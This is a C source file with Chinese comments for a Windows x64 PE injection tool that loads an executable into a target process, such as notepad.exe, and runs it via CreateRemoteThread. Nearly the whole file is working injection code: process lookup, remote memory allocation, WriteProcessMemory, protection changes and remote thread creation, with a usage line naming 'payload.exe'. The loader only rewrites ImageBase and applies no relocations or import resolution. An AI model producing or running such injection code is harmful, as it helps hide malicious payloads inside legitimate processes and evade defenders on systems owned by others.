/*
 * PE Injection - Loaded Module Reflection
 *
 * 将完整 PE 映像注入目标进程并执行
 *
 * 核心原理：
 * 1. 读取 PE 文件到内存
 * 2. 在目标进程分配空间
 * 3. 修改 ImageBase 为目标地址
 * 4. 复制整个 PE 到目标进程
 * 5. 计算入口点偏移
 * 6. CreateRemoteThread 在入口点执行
 */

#include <windows.h>
#include <stdio.h>
#include <psapi.h>
#include <tlhelp32.h>

// 根据进程名获取 PID
DWORD GetProcessIdByName(const char* processName)
{
    PROCESSENTRY32 pe32 = {0};
    pe32.dwSize = sizeof(PROCESSENTRY32);

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }

    if (!Process32First(hSnapshot, &pe32)) {
        CloseHandle(hSnapshot);
        return 0;
    }

    do {
        if (_stricmp(pe32.szExeFile, processName) == 0) {
            CloseHandle(hSnapshot);
            return pe32.th32ProcessID;
        }
    } while (Process32Next(hSnapshot, &pe32));

    CloseHandle(hSnapshot);
    return 0;
}

// 读取 PE 文件
BOOL ReadPEFile(const char* filePath, BYTE** pBuffer, DWORD* pFileSize)
{
    HANDLE hFile = CreateFileA(filePath, GENERIC_READ, FILE_SHARE_READ, NULL,
                               OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[!] 无法打开文件: %s (错误: %lu)\n", filePath, GetLastError());
        return FALSE;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE) {
        printf("[!] 获取文件大小失败: %lu\n", GetLastError());
        CloseHandle(hFile);
        return FALSE;
    }

    *pBuffer = (BYTE*)malloc(fileSize);
    if (!*pBuffer) {
        printf("[!] 内存分配失败\n");
        CloseHandle(hFile);
        return FALSE;
    }

    DWORD bytesRead = 0;
    if (!ReadFile(hFile, *pBuffer, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
        printf("[!] 读取文件失败: %lu\n", GetLastError());
        free(*pBuffer);
        CloseHandle(hFile);
        return FALSE;
    }

    CloseHandle(hFile);
    *pFileSize = fileSize;
    return TRUE;
}

// 验证 PE 文件
BOOL ValidatePE(BYTE* buffer, DWORD fileSize)
{
    if (fileSize < sizeof(IMAGE_DOS_HEADER)) {
        printf("[!] 文件太小，不是有效的 PE\n");
        return FALSE;
    }

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)buffer;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        printf("[!] 无效的 DOS 签名\n");
        return FALSE;
    }

    if (fileSize < pDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS64)) {
        printf("[!] 无效的 PE 结构\n");
        return FALSE;
    }

    PIMAGE_NT_HEADERS64 pNtHeaders = (PIMAGE_NT_HEADERS64)(buffer + pDosHeader->e_lfanew);
    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        printf("[!] 无效的 NT 签名\n");
        return FALSE;
    }

    if (pNtHeaders->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
        printf("[!] 只支持 x64 PE 文件\n");
        return FALSE;
    }

    return TRUE;
}

// PE 注入核心函数
BOOL InjectPE(DWORD targetPid, BYTE* peBuffer, DWORD fileSize)
{
    BOOL result = FALSE;
    HANDLE hProcess = NULL;
    LPVOID remoteImage = NULL;
    BYTE* shadowBuffer = NULL;

    // 解析 PE 结构
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)peBuffer;
    PIMAGE_NT_HEADERS64 pNtHeaders = (PIMAGE_NT_HEADERS64)(peBuffer + pDosHeader->e_lfanew);
    DWORD imageSize = pNtHeaders->OptionalHeader.SizeOfImage;
    DWORD entryPointRva = pNtHeaders->OptionalHeader.AddressOfEntryPoint;

    printf("[*] 目标进程 PID: %lu\n", targetPid);
    printf("[*] PE 映像大小: %lu 字节\n", imageSize);
    printf("[*] 入口点 RVA: 0x%lX\n", entryPointRva);

    // 打开目标进程
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
    if (!hProcess) {
        printf("[!] 无法打开目标进程: %lu\n", GetLastError());
        goto cleanup;
    }

    printf("[+] 已打开目标进程\n");

    // 在目标进程分配内存
    remoteImage = VirtualAllocEx(hProcess, NULL, imageSize,
                                 MEM_COMMIT | MEM_RESERVE,
                                 PAGE_EXECUTE_READWRITE);
    if (!remoteImage) {
        printf("[!] VirtualAllocEx 失败: %lu\n", GetLastError());
        goto cleanup;
    }

    printf("[+] 远程内存分配: 0x%p (大小: %lu 字节)\n", remoteImage, imageSize);

    // 创建影子缓冲区
    shadowBuffer = (BYTE*)malloc(imageSize);
    if (!shadowBuffer) {
        printf("[!] 影子缓冲区分配失败\n");
        goto cleanup;
    }

    memset(shadowBuffer, 0, imageSize);

    // 复制 PE 头
    memcpy(shadowBuffer, peBuffer, pNtHeaders->OptionalHeader.SizeOfHeaders);

    // 复制所有节
    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);
    for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
        if (pSectionHeader[i].SizeOfRawData > 0) {
            memcpy(shadowBuffer + pSectionHeader[i].VirtualAddress,
                   peBuffer + pSectionHeader[i].PointerToRawData,
                   pSectionHeader[i].SizeOfRawData);
        }
    }

    // 修改影子缓冲区中的 ImageBase
    PIMAGE_NT_HEADERS64 pShadowNtHeaders = (PIMAGE_NT_HEADERS64)(shadowBuffer + pDosHeader->e_lfanew);
    pShadowNtHeaders->OptionalHeader.ImageBase = (DWORD64)remoteImage;

    printf("[*] 已更新 ImageBase: 0x%p\n", remoteImage);

    // 写入目标进程
    SIZE_T bytesWritten = 0;
    if (!WriteProcessMemory(hProcess, remoteImage, shadowBuffer, imageSize, &bytesWritten)) {
        printf("[!] WriteProcessMemory 失败: %lu\n", GetLastError());
        goto cleanup;
    }

    printf("[+] 已写入 %lu 字节到目标进程\n", (unsigned long)bytesWritten);

    // 修改内存保护为 RX
    DWORD oldProtect = 0;
    if (!VirtualProtectEx(hProcess, remoteImage, imageSize, PAGE_EXECUTE_READ, &oldProtect)) {
        printf("[!] VirtualProtectEx 失败: %lu\n", GetLastError());
        goto cleanup;
    }

    // 计算远程入口点地址
    LPVOID remoteEntryPoint = (LPVOID)((ULONG_PTR)remoteImage + entryPointRva);

    printf("[*] 远程入口点: 0x%p\n", remoteEntryPoint);

    // 创建远程线程
    DWORD threadId = 0;
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
                                       (LPTHREAD_START_ROUTINE)remoteEntryPoint,
                                       NULL, 0, &threadId);
    if (!hThread) {
        printf("[!] CreateRemoteThread 失败: %lu\n", GetLastError());
        goto cleanup;
    }

    printf("[+] 远程线程已创建: TID=%lu\n", threadId);
    printf("[+] PE 注入成功!\n");

    CloseHandle(hThread);
    result = TRUE;

cleanup:
    if (shadowBuffer) free(shadowBuffer);
    if (hProcess) CloseHandle(hProcess);

    return result;
}

int main(int argc, char* argv[])
{
    printf("========================================\n");
    printf("  PE Injection - Loaded Module Reflection\n");
    printf("  x64 版本\n");
    printf("========================================\n\n");

    if (argc != 3) {
        printf("用法: %s <目标进程名或PID> <PE文件路径>\n", argv[0]);
        printf("示例: %s notepad.exe payload.exe\n", argv[0]);
        printf("      %s 1234 payload.exe\n", argv[0]);
        return 1;
    }

    // 解析目标进程
    DWORD targetPid = 0;
    if (isdigit(argv[1][0])) {
        targetPid = atoi(argv[1]);
    } else {
        targetPid = GetProcessIdByName(argv[1]);
        if (targetPid == 0) {
            printf("[!] 未找到进程: %s\n", argv[1]);
            return 1;
        }
    }

    // 读取 PE 文件
    BYTE* peBuffer = NULL;
    DWORD fileSize = 0;

    if (!ReadPEFile(argv[2], &peBuffer, &fileSize)) {
        return 1;
    }

    printf("[+] 已读取 PE 文件: %s (%lu 字节)\n", argv[2], fileSize);

    // 验证 PE
    if (!ValidatePE(peBuffer, fileSize)) {
        free(peBuffer);
        return 1;
    }

    printf("[+] PE 验证通过\n\n");

    // 执行注入
    BOOL success = InjectPE(targetPid, peBuffer, fileSize);

    free(peBuffer);

    return success ? 0 : 1;
}
